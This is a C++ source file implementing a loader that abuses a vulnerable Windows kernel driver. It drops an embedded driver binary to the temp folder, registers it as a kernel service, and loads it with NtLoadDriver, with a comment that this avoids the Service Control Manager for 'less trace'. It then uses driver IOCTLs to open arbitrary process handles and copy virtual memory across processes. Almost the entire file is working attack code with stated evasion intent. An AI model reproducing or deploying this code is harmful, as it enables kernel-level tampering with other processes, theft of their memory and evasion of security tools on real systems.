#include "pch.h"
#include "vul_driver.h"

auto vul_driver::get_full_driver_path() const -> std::optional<std::wstring>
{
  if (auto temp_path = utils::get_temp_path(); !temp_path)
    return std::nullopt;
  else
    return *temp_path + this->driver_name + L".sys";
}

auto vul_driver::install() const -> void
{
  const auto full_driver_path = get_full_driver_path();
  // check if the driver already exists
  std::filesystem::path path(full_driver_path.value_or(L""));
  if (std::filesystem::exists(path))
  {
    const int status = _wremove(full_driver_path.value_or(L"").c_str());
    if (status != 0)
    {
      throw KUR_ERROR("Removing old driver file failed");
    }
  }

  std::ofstream sys_file(*full_driver_path, std::ios::out | std::ios::binary);
  if (!sys_file)
  {
    throw KUR_ERROR("Creating driver file failed");
  }
  sys_file.write(reinterpret_cast<const char*>(echo_driver_resource::driver), sizeof(echo_driver_resource::driver));
  sys_file.close();
}

auto vul_driver::setup_reg_key() const -> void
{
  const std::wstring services_path = SERVICE_PATH_COMMON + this->driver_name;
  const HKEY h_key_root = HKEY_LOCAL_MACHINE;
  const auto l_status = utils::open_reg_key(h_key_root, services_path.c_str());
  if (l_status == ERROR_SUCCESS)
  {
    delete_reg_key();
  }

  HKEY h_service;
  if (RegCreateKeyW(h_key_root, services_path.c_str(), &h_service) != ERROR_SUCCESS)
  {
    throw KUR_ERROR("Creating service key failed");
  }
  const std::wstring global_namespace_driver_path = L"\\??\\" + get_full_driver_path().value_or(L"");
  //set image path first
  const LSTATUS status = RegSetKeyValueW(h_service, NULL, L"ImagePath", REG_EXPAND_SZ,
                                         global_namespace_driver_path.c_str(),
                                         // wchar has double size of char
                                         (DWORD)(global_namespace_driver_path.size() * sizeof(wchar_t)));
  if (status != ERROR_SUCCESS)
  {
    RegCloseKey(h_service);
    throw KUR_ERROR("Setting ImagePath failed");
  }

  const DWORD dwTypeValue = SERVICE_KERNEL_DRIVER;
  // set Type to service
  RegSetKeyValueW(h_service, NULL, L"Type", REG_DWORD, &dwTypeValue, sizeof(DWORD));
  if (status != ERROR_SUCCESS)
  {
    RegCloseKey(h_service);
    throw KUR_ERROR("Setting Type failed");
  }

  RegCloseKey(h_service);
}

auto vul_driver::load() const -> void
{
  auto ntdll = utils::get_ntdll();
  if (!ntdll)
  {
    throw KUR_ERROR("Obtaining handle for ntdll failed.");
  }
  const auto RtlAdjustPrivilege = reinterpret_cast<utils::RtlAdjustPrivilege>(GetProcAddress(
    *ntdll, "RtlAdjustPrivilege"));
  const auto NtLoadDriver = reinterpret_cast<utils::NtLoadDriver>(GetProcAddress(*ntdll, "NtLoadDriver"));
  if (!RtlAdjustPrivilege || !NtLoadDriver)
  {
    throw KUR_ERROR("Couldn't get address of RtlAdjustPrivilege or NtLoadDriver");
  }

  BOOLEAN old = FALSE;
  NTSTATUS status = RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &old);
  if (!NT_SUCCESS(status))
  {
    throw KUR_ERROR("RtlAdjustPrivilege failed with NTSTATUS code: " + std::to_string(status));
  }

  std::wstring wdriver_reg_path = L"\\Registry\\Machine\\" + SERVICE_PATH_COMMON + this->driver_name;
  UNICODE_STRING service_path;
  RtlInitUnicodeString(&service_path, wdriver_reg_path.c_str());

  // when you load your driver with NtLoadDriver, it won't be registered with the Service Control Manager (SCM). Less trace.
  status = NtLoadDriver(&service_path);

  constexpr auto STATUS_IMAGE_ALREADY_LOADED = 0xC000010E;

  if (status == STATUS_IMAGE_ALREADY_LOADED)
  {
    std::cout << "Driver has been already loaded" << std::endl;
  }
  else if (!NT_SUCCESS(status))
  {
    throw KUR_ERROR("NtLoadDriver failed with NTSTATUS code: " + std::to_string(status));
  }
}

auto vul_driver::get_device_handle() -> void
{
  HANDLE handle;
  OBJECT_ATTRIBUTES obj_attr;
  UNICODE_STRING uni_device_name;
  IO_STATUS_BLOCK io_status_block;

  RtlInitUnicodeString(&uni_device_name, this->device_name.c_str());

  InitializeObjectAttributes(&obj_attr, &uni_device_name,
                             OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

  constexpr ULONG share_access = 0;
  constexpr ULONG open_options = 0;

  const NTSTATUS status = NtOpenFile(&handle,
                                     GENERIC_READ | GENERIC_WRITE,
                                     &obj_attr,
                                     &io_status_block,
                                     share_access,
                                     open_options);

  if (!NT_SUCCESS(status))
  {
    this->h_device = INVALID_HANDLE_VALUE;
    throw KUR_ERROR("NtOpenFile failed with NTSTATUS code: " + std::to_string(status));
  }
  // This handle has to be closed with CloseHandle(device_handle);
  this->h_device = handle;
}

auto vul_driver::uninstall() const -> void
{
  // delete the driver file
  int ok = _wremove(get_full_driver_path().value_or(L"").c_str());
  if (ok != 0)
  {
    throw KUR_ERROR("Uninstalling driver failed");
  }
}

auto vul_driver::delete_reg_key() const -> void
{
  const LSTATUS status = RegDeleteTreeW(HKEY_LOCAL_MACHINE, (SERVICE_PATH_COMMON + this->driver_name).c_str());
  if (status != ERROR_SUCCESS)
  {
    if (status == ERROR_FILE_NOT_FOUND)
    {
    }
    throw KUR_ERROR("Deleting service key failed with error code: " + std::to_string(status));
  }
}

auto vul_driver::unload() const -> void
{
  const auto ntdll = utils::get_ntdll();
  if (!ntdll)
  {
    throw KUR_ERROR("Obtaining handle for ntdll failed.");
  }

  std::wstring wdriver_reg_path = L"\\Registry\\Machine\\" + SERVICE_PATH_COMMON + this->driver_name;
  UNICODE_STRING service_path;
  RtlInitUnicodeString(&service_path, wdriver_reg_path.c_str());

  const auto NtUnloadDriver = reinterpret_cast<utils::NtUnloadDriver>(GetProcAddress(*ntdll, "NtUnloadDriver"));
  NTSTATUS status = NtUnloadDriver(&service_path);
  if (status != 0x0)
  {
    delete_reg_key();
    throw KUR_ERROR("couldn't unload driver with NTSTATUS code: " + std::to_string(status));
  }
}

auto vul_driver::ioctl_initialize_driver() const -> void
{
  initialize_driver_t req{};
  auto status = DeviceIoControl(this->h_device, VUL_DRIVER_INITIALISE_IOCTL, &req, sizeof(req), &req, sizeof(req), NULL, NULL);
  if (!status)
  {
    throw KUR_ERROR("ioctl_initialize_driver failed");
  }
}

auto vul_driver::ioctl_get_process_handle(DWORD pid, ACCESS_MASK access_mask) -> std::optional<HANDLE>
{
  get_handle_buffer_t req{};
  req.pid = pid;
  req.access = access_mask;

  const BOOL status = DeviceIoControl(this->h_device, VUL_DRIVER_GET_HANDLE_IOCTL, &req, sizeof(req), &req, sizeof(req),
                                      NULL, NULL);

  if (!status)
  {
    return std::nullopt;
  }

  return req.h_process;
}

auto vul_driver::ioctl_mm_copy_virtual_memory(void* from_address, void* to_address, size_t len,
                                              HANDLE h_target_process) -> BOOL
{
  copy_buffer_t req{};
  req.from_address = from_address;
  req.to_address = to_address;
  req.buffer_size = len;
  req.h_target_process = h_target_process;

  DWORD bytes_returned = 0;

  auto status = DeviceIoControl(this->h_device, VUL_DRIVER_COPY_IOCTL, &req, sizeof(req), &req, sizeof(req),
                                &bytes_returned, NULL);
  if (!status)
  {
    return FALSE;
  }
  return TRUE;
}
